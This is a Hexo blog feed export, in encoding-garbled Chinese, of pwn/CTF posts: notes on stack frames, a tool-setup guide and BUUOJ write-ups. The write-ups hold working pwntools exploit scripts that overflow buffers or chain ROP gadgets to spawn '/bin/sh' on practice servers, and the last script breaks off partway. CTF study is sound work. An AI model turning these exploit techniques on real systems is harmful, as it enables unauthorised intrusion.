      <url>/2022/07/stack-overflow/</url>
      
        <content type="html"><![CDATA[<h2 id="æ ˆçš„åˆ›å»ºä¸é”€æ¯">æ ˆçš„åˆ›å»ºä¸é”€æ¯</h2><p>å…ˆå¤ä¹ ä¸€ä¸‹æ ˆçš„åˆ›å»ºä¸é”€æ¯è¿‡ç¨‹</p><h3 id="ä¼ å‚">ä¼ å‚</h3><p>x86ä¸‹ä¼ å‚æ–¹å¼æ˜¯å°†å‡½æ•°ä¾æ¬¡å‹å…¥æ ˆä¸­ã€‚<br>å¦‚æœä¸€ä¸ªå‡½æ•°å£°æ˜ä¸ºfun(arg1,arg2,arg3,arg4,â€¦,argn),åˆ™åœ¨è°ƒç”¨funå‡½æ•°æ—¶ï¼Œä¼šä½¿ç”¨<code>push</code>æŒ‡ä»¤ä¾æ¬¡å°†argn,â€¦,arg4,arg3,arg2,arg1å‹å…¥æ ˆä¸­ã€‚<br>å³</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push argn</span><br><span class="line">â€¦â€¦</span><br><span class="line">push arg1</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯linux/macosä¸‹çš„x64æŒ‡ä»¤ï¼ˆwindowså¥½åƒæœ‰å…¶ä»–è§„å®šï¼‰ï¼Œåˆ™å‰6ä¸ªå‚æ•°ä¾æ¬¡æ”¾å…¥rdi, rsi, rdx, rcx, r8, r9ï¼Œä»ç¬¬ä¸ƒä¸ªå‚æ•°å¼€å§‹æŒ‰ç…§x86çš„æ–¹å¼é€†åºå…¥æ ˆ<br>è‹¥æœ‰ä¸€ä¸ªå‡½æ•°fun(arg1,arg2,arg3,arg4,arg5,arg6â€¦,argn)<br>arg1-&gt;%rdi,arg2-&gt;%rsi,arg3-&gt;%rdx,arg4-&gt;%rcx,arg5-&gt;%r8,arg6-&gt;%r9ï¼Œ<br>å‰©ä¸‹çš„å‚æ•°ä¾æ¬¡pushè¿›æ ˆä¸­ã€‚ï¼ˆæœ‰ç‚¹ç±»ä¼¼äºfastcallï¼‰<br>å…³äºä¼ å‚å¯ä»¥å‚è€ƒ</p><h3 id="call-å‡½æ•°">call å‡½æ•°</h3><p>callå‡½æ•°åŒ…å«äº†ä¸¤æ­¥</p><ul><li>å°†æ­¤æ—¶eip(æˆ–ripï¼Œå³ç¨‹åºè®¡æ•°å¯„å­˜å™¨)ä¸­çš„å€¼å‹å…¥æ ˆä¸­ã€‚æ ˆæº¢å‡ºå¸¸åœ¨æ­¤å¤„åšæ–‡ç« ã€‚</li><li>è·³è½¬åˆ°å‡½æ•°çš„æ‰§è¡Œä½ç½®ã€‚</li></ul><h3 id="push-ebp-rbp">push ebp(rbp)</h3><p>è¿™ä¸€æ­¥æ˜¯ä¿å­˜ä¸»è°ƒå‡½æ•°çš„</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnæ‰€éœ€ç¯å¢ƒ</title>
      <link href="/2022/07/pwn-environment/"/>
      <url>/2022/07/pwn-environment/</url>
      
        <content type="html"><![CDATA[<p>è£…æ–°ç”µè„‘éœ€è¦é…ç¯å¢ƒï¼Œå°±è¡¥ä¸€ä¸‹ã€‚ä½¿ç”¨çš„ç¯å¢ƒæ˜¯Ubuntu 22, 18å’Œ20çš„å®‰è£…æ–¹æ³•åŒä¸‹ï¼Œ16çš„ç¯å¢ƒè¯•äº†å¾ˆä¹…ï¼Œè¿˜æ˜¯ä¸è¡Œã€‚<br>æŒç»­æ›´æ–°ã€‚ç”¨åˆ°çš„æ—¶å€™å†è¡¥å§ï¼ˆå’•å’•å’•ï¼‰</p><h2 id="pwntools">pwntools</h2><p>ç›´æ¥ç”¨pipä¸‹è½½pwntoolså³å¯ï¼ˆæ³¨æ„å…³æ³¨pipç‰ˆæœ¬ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools</span><br></pre></td></tr></table></figure><p>ä¸‹è½½å®Œå¯ä»¥åœ¨pythonä¸­å°è¯•å¯¼å…¥pwnæ¨¡å—ï¼Œæ²¡æœ‰æŠ¥é”™å°±æ˜¯èƒœåˆ©ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œä¸‹è½½å®Œpwntoolsåï¼Œä¼šæœ‰ä¸€äº›é™„å¸¦çš„æœ‰ç”¨å·¥å…·ï¼Œæ¯”å¦‚<code>checksec</code>ã€‚<br>checksecä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec file</span><br></pre></td></tr></table></figure><h2 id="IDA">IDA</h2><p>52ç ´è§£ä¸Šç›´æ¥ä¸‹ã€‚æˆ‘è¿™é‡Œç›´æ¥ä¸‹åœ¨æœ¬æœºä¸Šäº†ã€‚</p><h2 id="pwndbg">pwndbg</h2><p>pwndbgæ˜¯è°ƒè¯•å·¥å…·gdbçš„ä¸€ä¸ªæ’ä»¶ï¼Œæ‹¥æœ‰æ›´å¼ºå¤§çš„åŠŸèƒ½<br>æŒ‰ç…§å®˜æ–¹çš„å®‰è£…æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‰§è¡Œå®Œä¸Šè¿°å‘½ä»¤åï¼Œä½¿ç”¨<code>gdb</code>å³å¯ä½¿ç”¨pwndbgã€‚ï¼ˆæ¯•ç«Ÿpwndbgå°±æ˜¯gdbçš„ä¸€ä¸ªæ’ä»¶å˜›ï¼‰<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200425.png" alt="æ•ˆæœ"><br>å¦‚æœé‡åˆ°gdbæ²¡æœ‰è‡ªåŠ¨å¯ç”¨pwndbgçš„æƒ…å†µï¼Œå¯ä»¥ç”¨ä»¥ä¸‹æ–¹æ³•å¤„ç†ã€‚<br>ä¸‹å›¾è¯´æ˜gdbæ²¡æœ‰å¯ç”¨pwndbgæ’ä»¶ï¼ˆè¿›å…¥åŸç”Ÿçš„gdbï¼‰ã€‚<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200406.png" alt="æ•ˆæœ"><br>åœ¨å¯åŠ¨æ—¶ï¼Œgdbé€šå¸¸ä¼šå¤„ç†ä¸€ä¸ªåä¸º<code>.gdbinit</code>çš„åˆå§‹åŒ–æ–‡ä»¶ï¼Œgdbä¼šåœ¨å½“å‰ç›®å½•å’Œhomeç›®å½•ä¸‹å¯»æ‰¾è¯¥åˆå§‹åŒ–æ–‡ä»¶ï¼ˆhomeç›®å½•çš„ä¼˜å…ˆçº§é«˜äºå½“å‰ç›®å½•ï¼‰ï¼Œå¹¶æŠŠå®ƒçš„å†…å®¹ä½œä¸ºgdbå‘½ä»¤è¿›è¡Œè§£é‡Šã€‚<br>pwndbgåœ¨å®‰è£…æ—¶ä¼šç”Ÿæˆä¸€ä¸ª<code>.gdbinit</code>æ–‡ä»¶ï¼Œç”¨äºåŠ è½½æ‰§è¡Œpwndbgæ–‡ä»¶å¤¹ä¸‹çš„è„šæœ¬ã€‚å½“æˆ‘ä»¬ä½¿ç”¨<code>root</code>æƒé™æ‰§è¡Œå®‰è£…å‘½ä»¤æ—¶ï¼Œä¼šåœ¨<code>/root</code>æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆ<code>.gdbinit</code>æ–‡ä»¶ï¼Œè€Œç”¨æˆ·æ–‡ä»¶å¤¹ä¸‹æ²¡æœ‰ã€‚<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200442.png" alt="æŸ¥çœ‹"><br>å› æ­¤æˆ‘ä»¬åªéœ€è¦æŠŠ<code>/root</code>ä¸‹çš„<code>.gdbinit</code>å¤åˆ¶åˆ°ç”¨æˆ·æ–‡ä»¶å¤¹ä¸‹å³å¯ã€‚<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20200534.png" alt="å¤åˆ¶"><br>å°±å¯ä»¥ä½¿ç”¨pwndbgäº†ã€‚</p><h2 id="ROPgadget">ROPgadget</h2><p>ROPgadgetæ˜¯ä¸€æ¬¾å¯ä»¥åœ¨äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æœç´¢gadgetçš„å·¥å…·ï¼Œå¯ä»¥ä¾¿äºæˆ‘ä»¬å®ç°ROP<br>å› ä¸ºROPgadgetåŸºäºpython3å¼€å‘ï¼Œå› æ­¤ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å³å¯å®‰è£…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install ROPgadget</span><br></pre></td></tr></table></figure><p>å¦‚æœç¼ºå°‘åº“å¯ä»¥æ ¹æ®å®˜æ–¹æ–‡æ¡£è¡¥å……ã€‚<br>åœ¨å®‰è£…è¿‡ç¨‹ä¸­é‡åˆ°äº†ä»¥ä¸‹æŠ¥é”™<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194511.png" alt="æŠ¥é”™"><br>ä½¿ç”¨<code>find / -name ROPgadget</code>æŸ¥æ‰¾ç›¸å…³æ–‡ä»¶å¤¹<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194523.png" alt="æŸ¥æ‰¾ç»“æœ"><br>ä½¿ç”¨<code>cp -r</code>å‘½ä»¤å°†<code>ROPgadget/scripts</code>æ–‡ä»¶å¤¹å¤åˆ¶åˆ°æŠ¥é”™æ˜¾ç¤ºçš„æ–‡ä»¶å¤¹ä¸‹ï¼Œå³å¯è§£å†³é—®é¢˜<br><img src="%E2%95%9E%E2%94%B4%E2%94%80%E2%95%97%E2%95%9C%E2%95%AA%E2%95%90%E2%95%9D%202023-11-27%20194455.png" alt="è§£å†³"></p><h2 id="onegadget">onegadget</h2><p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å®‰è£…</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install one_gadget</span><br></pre></td></tr></table></figure><p>æ¥ç€ç›´æ¥ä½¿ç”¨ï¼Œå³å¯ç›´æ¥æŸ¥çœ‹<code>gadget</code>ï¼Œé€šå¸¸æˆ‘ä»¬æŸ¥çœ‹<code>libc</code>æ–‡ä»¶ï¼Œå› ä¸º<code>libc</code>ä¸­å­˜åœ¨çš„one_gadgetï¼ˆç›´æ¥è°ƒç”¨ç±»ä¼¼äº<code>execve('/bin/sh', 0, 0)</code>çš„è¯­å¥ï¼‰æ¯”è¾ƒå¤šã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨one_gadgetå¾€å¾€éœ€è¦æ»¡è¶³ç‰¹å®šçš„æ¡ä»¶ï¼Œå› æ­¤éœ€è¦è€å¿ƒè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget file</span><br></pre></td></tr></table></figure><p>æ•ˆæœå¦‚ä¸‹å›¾,åŒ…å«äº†one_gadgetçš„åç§»åœ°å€ä»¥åŠ<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-09-24%20220241.png" alt="ä½¿ç”¨æ•ˆæœ"></p><h2 id="LibcSearch">LibcSearch</h2><p>ä¸å¦‚ç›´æ¥ä¸Šç½‘ <a href="https://libc.blukat.me/">https://libc.blukat.me/</a> (æ‰“å¼€æ¯”è¾ƒæ…¢)<br>å› ä¸ºåœ¨ä¸åŒlibcä¸­ï¼Œä»£ç ä¼šæœ‰ä¸åŒï¼Œå› æ­¤åº“ä¸­çš„å‡½æ•°åç§»é‡å¯èƒ½ä¸åŒã€‚å‡½æ•°çš„åç§»é‡å¯ä»¥ä½œä¸ºlibcç‰ˆæœ¬çš„ç‰¹å¾ï¼Œä»è€Œå¸®åŠ©æˆ‘ä»¬æ¨æµ‹å‡ºlibcçš„ç‰ˆæœ¬ã€‚<br>é¡µæ˜¯linuxå†…æ ¸ç®¡ç†ç‰©ç†å†…å­˜çš„æœ€å°å•ä½ï¼Œå†…æ ¸å°†æ•´ä¸ªç‰©ç†å†…å­˜æŒ‰ç…§é¡µå¯¹é½æ–¹å¼åˆ’åˆ†æˆåƒä¸Šä¸‡ä¸ªé¡µè¿›è¡Œç®¡ç†ã€‚å› ä¸ºlinuxå†…æ ¸ä¸­é¡µå¯¹é½æœºåˆ¶çš„å­˜åœ¨ï¼ŒASLRï¼ˆåœ°å€éšæœºåŒ–ï¼‰ä¸ä¼šå½±å“ä½12ä½ï¼ˆlinuxä¸­é¡µçš„å¤§å°æ—¶4KBï¼‰ã€‚å› æ­¤åœ¨æ”»å‡»ä¸­ï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦æ³„éœ²éƒ¨åˆ†å‡½æ•°çš„åœ°å€ï¼Œå–å‡ºåä¸‰å­—èŠ‚ï¼Œå¹¶ä¾æ®è¿™äº›ä¿¡æ¯ï¼Œè·å–è¯¥å‡½æ•°åœ¨libcä¸­çš„åç§»é‡ä»¥åŠæˆ‘ä»¬éœ€è¦çš„ç‰¹å®šå‡½æ•°ä¸å­—ç¬¦ä¸²çš„åœ°å€(<code>system('/bin/sh')</code>)ã€‚é€šè¿‡LibcSearchï¼ˆæˆ–è€…è¯´ä¸Šé¢çš„ç½‘ç«™ï¼‰å¯ä»¥æ¨æµ‹å‡ºè¾ƒä¸ºå‡†ç¡®çš„libcç‰ˆæœ¬ã€‚<br>ä½¿ç”¨æ–¹æ³•å¦‚ä¸‹ï¼Œåªéœ€è¦è¾“å…¥å‡½æ•°åç§°ä¸åä¸‰å­—èŠ‚å³å¯ã€‚<br><img src="%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-12-12%20224505.png" alt="ä½¿ç”¨ç¤ºä¾‹"></p><h2 id="Patchelf-glibc-all-in-one">Patchelf &amp;&amp; glibc-all-in-one</h2><p>ç»å¸¸ä¼šç¢°åˆ°å› ä¸ºlibcç‰ˆæœ¬ä¸ä¸€è‡´æ‰“ä¸é€šçš„æƒ…å†µï¼Œè¿™ä¸¤ä¸ªå·¥å…·ç»„åˆå¯ä»¥è§£å†³libcç‰ˆæœ¬ä¸ä¸€è‡´çš„é—®é¢˜ã€‚<br><code>patchelf</code>ç›´æ¥aptå®‰è£…å³å¯ï¼Œæ¯”è¾ƒæ–¹ä¾¿ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure><p><code>glibc-all-in-one</code>å®‰è£…ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿ï¼Œç›´æ¥<code>git clone https://github.com/matrix1001/glibc-all-in-one.git</code>å³å¯<br>ä½¿ç”¨<code>./update_list</code>æ›´æ–°Listï¼Œæ¥ç€ä½¿ç”¨<code>cat list</code>æˆ–<code>cat old_list</code>å³å¯æŸ¥çœ‹libcç‰ˆæœ¬<br>ä¸‹è½½æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./download libc_version</span><br></pre></td></tr></table></figure><p><code>patchelf</code>ä¸»è¦ç”¨æ¥ä¿®æ”¹ç¨‹åºçš„é“¾æ¥è·¯å¾„æˆ–ä¾èµ–åº“ä¿¡æ¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --set-rpath libc_path elf_path</span><br></pre></td></tr></table></figure><p>æˆ‘åœ¨æ¯”èµ›ä¸­å‘ç°ä¹Ÿå¯ä»¥è¿™ä¹ˆæ”¹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter ld_path elf_path</span><br><span class="line">patchelf --replace-needed libc.so.6 libc_path elf_path</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨åå¯ä»¥ä½¿ç”¨<code>ldd</code>æŸ¥çœ‹æ•ˆæœ<br><img src="%E6%88%AA%E5%9B%BE%202024-09-24%2022-25-31.png" alt="æ•ˆæœ"></p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUOJ pwn wp 2</title>
      <link href="/2022/07/buuoj-pwn-wp2/"/>
      <url>/2022/07/buuoj-pwn-wp2/</url>
      
        <content type="html"><![CDATA[<p>æŒç»­æ›´æ–°</p><h2 id="ciscn-2019-n-8">ciscn_2019_n_8</h2><p>checksec,Canary,PIE,NXå‡å¼€å¯<br><img src="2022-07-28%20125400.jpg" alt="checksec1"></p><p>IDAåˆ†æ<br><img src="2022-07-28%20125812.jpg" alt="IDA1"><br>æ‰€ä»¥åªéœ€è¦ä½¿var_13çš„å€¼ä¸º17å³å¯æ‹¿shellï¼Œisoc99_scanfæœªé™å®šè¾“å…¥é•¿åº¦ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28421</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">r.recvline()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">13</span> * <span class="number">4</span> + p32(<span class="number">17</span>) <span class="comment"># intæœ‰4å­—èŠ‚</span></span><br><span class="line"><span class="comment"># payload = p32(17) * 14</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;87eae600-681d-4257-9cbc-5c49f597082f&#125;</code></p><h2 id="jarvisoj-level2">jarvisoj_level2</h2><p>checksecï¼Œå†IDAåˆ†æ<br><img src="2022-07-28%20132109.jpg" alt="IDA2"><br>bufåˆ†é…çš„ç©ºé—´å¤§å°æ˜æ˜¾å°äºreadå‡½æ•°å…è®¸è¯»å…¥çš„å­—ç¬¦é•¿åº¦ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚<br>ä¸”è¯¥ç¨‹åºæœ‰systemå‡½æ•°å’Œâ€™/bin/shâ€™ï¼Œå¯ä»¥æ„é€ æ‹¿shellã€‚å¾ˆç®€å•çš„æ ˆæº¢å‡ºã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25097</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./level2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;level2&#x27;</span>)</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span> + <span class="number">0x4</span>) + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(bin_sh_addr)</span><br><span class="line"><span class="comment"># r.recvline()</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;877fe44d-2b7a-4891-abf9-1e998db084ec&#125;</code></p><h2 id="bjdctf-2020-babystack">bjdctf_2020_babystack</h2><p>checksecï¼Œå†IDAåˆ†æ<br><img src="2022-07-28%20132857.jpg" alt="IDA3"><br>å­˜åœ¨backdoorå‡½æ•°ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨<code>system('/bin/sh')</code>æ‹¿shellã€‚<br>mainå‡½æ•°ä¸­readå‡½æ•°è¯»å…¥çš„å­—ç¬¦ä¸²é•¿åº¦æ˜¯æˆ‘ä»¬è‡ªå·±æ§åˆ¶çš„ï¼Œç»™bufåˆ†é…çš„ç©ºé—´å´æ˜¯å›ºå®šçš„ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥ä¸€ä¸ªè¾ƒå¤§çš„æ•°å­—ï¼Œä»è€Œä½¿ç¨‹åºå‘ç”Ÿæ ˆæº¢å‡ºã€‚<br><img src="2022-07-28%20133313.jpg" alt="gdb1"><br>éœ€è¦(0x10+0x8)ä¸ªå­—èŠ‚çš„åƒåœ¾æ•°æ®ï¼Œè¿˜éœ€è¦backdoorå‡½æ•°çš„åœ°å€ï¼Œç¼–å†™è„šæœ¬å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27010</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./bjdctf_2020_babystack&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;bjdctf_2020_babystack&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400833</span></span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>] <span class="comment"># </span></span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>)) <span class="comment"># </span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr) <span class="comment"># </span></span><br><span class="line"><span class="comment"># å¼€å§‹æ—¶æ²¡æ²¡çœ‹åˆ°bakcdoorå‡½æ•°ï¼Œä½¿ç”¨çš„æ˜¯ROPï¼Œä½¿ç”¨ä»¥ä¸‹è¯­å¥è¿›è¡Œæ›¿æ¢ä¹Ÿæ˜¯å¯ä»¥çš„</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">r.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">length_payload = <span class="built_in">len</span>(payload)</span><br><span class="line"><span class="comment"># length_payload = flat([str(length_payload)]) å»ºè®®æ·»åŠ è¿™æ¡è¯­å¥</span></span><br><span class="line"><span class="comment"># r.sendline(length_payload)</span></span><br><span class="line">r.sendline(<span class="string">b&#x27;48&#x27;</span>)</span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flagä¸º<code>flag&#123;b2fb4957-e796-4af5-8112-86c2b7eba6c0&#125;</code></p><h2 id="OGeek2019-babyrop">[OGeek2019]babyrop</h2><p>checksec<br>IDAåˆ†æ<br><img src="2022-07-28%20165405.jpg" alt="1"><br><img src="2022-07-28%20165344.jpg" alt="2"><br><img src="2022-07-28%20165423.jpg" alt="3"><br>mainä¸­bufä¸ºéšæœºäº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œsub_804871Fä¸­è¦æ±‚æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²ä¸éšæœºäº§ç”Ÿçš„å­—ç¬¦ä¸²ä¸€å®šé•¿åº¦å­—ç¬¦ç›¸åŒï¼Œå¦åˆ™ç¨‹åºç›´æ¥é€€å‡ºã€‚<br>æˆ‘ä»¬åªéœ€è¦ä½¿strncmpå‡½æ•°è¿”å›ç»“æœä¸º0å³å¯ã€‚<br>strlenæ˜¯é‡åˆ°â€™\x00â€™ååœæ­¢è®¡ç®—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä»¤ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºâ€™\x00â€™ï¼Œè‹¥ä¼ å…¥strncmp()çš„é•¿åº¦å‚æ•°ä¸º0ï¼Œåˆ™strncmpå‡½æ•°è¿”å›å€¼ä¸º0ã€‚<br>sub_804871Fè¿”å›å€¼ä¸ºbuf[7]ï¼Œå³bufçš„ç¬¬8ä¸ªå…ƒç´ ï¼Œæœ‰ä½œä¸ºå‚æ•°ä¼ å…¥sub_80487D0ä¸­ã€‚è‹¥buf[7]çš„å€¼ä¸ä¸º127ï¼Œåˆ™è¯»å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ä¸ºbuf[7]çš„å€¼ã€‚<br>buf[7]ä¸ºint8(8ä½int)ï¼Œsub_804871Fä¸­bufé•¿åº¦ä¸º231å­—èŠ‚ï¼Œå°äº2^8-1ï¼Œå¯èƒ½å­˜åœ¨æ ˆæº¢å‡ºã€‚<br>æ­¤é¢˜æ²¡æœ‰systemå‡½æ•°å’Œâ€™/bin/shâ€™ï¼Œæˆ‘ä»¬éœ€è¦å†gotè¡¨ä¸­è¯»å–æŸä¸ªå‡½æ•°ï¼Œè¿™é‡Œæˆ‘ä»¬é€‰ç”¨writeè¯»å–writeè‡ªèº«çš„åœ°å€ã€‚è¯»å–åæ¥æ”¶è¿”å›æ•°æ®ï¼Œå¹¶è¿”å›mainå‡½æ•°ã€‚<br>å‘é€çš„ç¬¬ä¸€ä¸ªpayloadå¯æ„é€ ä¸ºbâ€™\x00â€™ + (6ä¸ªåƒåœ¾æ•°æ®) + bâ€™\xffâ€™<br>å‘é€çš„ç¬¬äºŒä¸ªpayloadä¸ºbâ€™aâ€™ * (0xe7 + 0x4) + writeå‡½æ•°çš„pltåœ°å€ + mainå‡½æ•° + writeç¬¬ä¸€ä¸ªå‚æ•°1 + writeåœ¨gotè¡¨ä¸­çš„åœ°å€ + writeçš„ç¬¬äºŒä¸ªå‚æ•°4<br>å›åˆ°mainå‡½æ•°åå‘é€é‡å¤ç¬¬ä¸€ä¸ªpayloadï¼Œå†å‘é€ç¬¬ä¸‰ä¸ªpayload<br>ç¬¬ä¸‰ä¸ªpayloadä¸ºbâ€™aâ€™ * (0xe7 + 0x4) + systemå‡½æ•°åœ°å€ + 4å­—èŠ‚åƒåœ¾æ•°æ® + '/bin/shâ€™åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26711</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># r = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = 